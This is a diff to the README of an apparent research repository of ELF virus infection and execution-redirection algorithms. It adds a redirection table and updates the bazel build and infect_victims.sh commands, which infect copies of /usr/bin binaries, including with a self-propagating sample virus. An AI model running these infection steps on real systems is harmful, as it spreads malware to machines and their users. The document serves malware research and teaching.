@@ -80,13 +80,22 @@ In this repo we present various infection algorithms that can infect:
 | reverse_text | :question:         | :heavy_check_mark: | :question:         | :heavy_check_mark: |
 | pt_note      | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |
 
+# Redirection Algorithms
+
+After virus code is injected, we provide ways to redirect host execution to run the virus and then hand control back to the host as if nothing has happened. Please see //redirection for more details.
+
+| Algorithm       | x86_64 DYN         | x86_64 EXEC        | aarch64 DYN        | aarch64 EXEC       |
+| --------------- | ------------------ | ------------------ | ------------------ | ------------------ |
+| entry_point     | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |
+| libc_main_start | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |
+
 To infect a single binary, run the following command:
 
 ```bash
 # build the infector and sample virus first
 bazel build //virus/... //infector:infector
 # infect a single binary (a copy of /usr/bin/ls) using the `pt_note` algorithm.
-infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note /usr/bin/ls
+infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/ls
 ```
 
 To infect all binaries from a path, run:
@@ -94,7 +103,7 @@ To infect all binaries from a path, run:
 ```bash
 bazel build //virus/... //infector:infector
 # infect all binaries in /usr/bin using the `pt_note` algorithm.
-infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note /usr/bin/
+infector/infect_victims.sh /tmp/bin/virus/test_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/
 ```
 
 To infect a single binary with self-propagation, run the following command:
@@ -103,7 +112,7 @@ To infect a single binary with self-propagation, run the following command:
 # build the infector and sample virus first
 bazel build //virus/... //infector:infector
 # infect a single binary (a copy of /usr/bin/ls) using the `pt_note` algorithm.
-infector/infect_victims.sh /tmp/bin/virus/self_propagating_virus.text /tmp/bin/infector/infector pt_note /usr/bin/ls
+infector/infect_victims.sh /tmp/bin/virus/self_propagating_virus.text /tmp/bin/infector/infector pt_note entry_point /usr/bin/ls
 cd /tmp && cp /usr/bin/pwd . && cp /usr/bin/ls .
 # run victim and let it propagate
 ./victim
@@ -112,10 +121,6 @@ cd /tmp && cp /usr/bin/pwd . && cp /usr/bin/ls .
 ```
 
 The scripts will make a copy of the victim binary and infect it with a sample virus. For more details please read the source.
-
-# Redirection Algorithms
-
-After virus code is injected, we provide ways to redirect host execution to run the virus and then hand control back to the host as if nothing has happened. Please see //redirection for more details.
 
 # Using C++
 
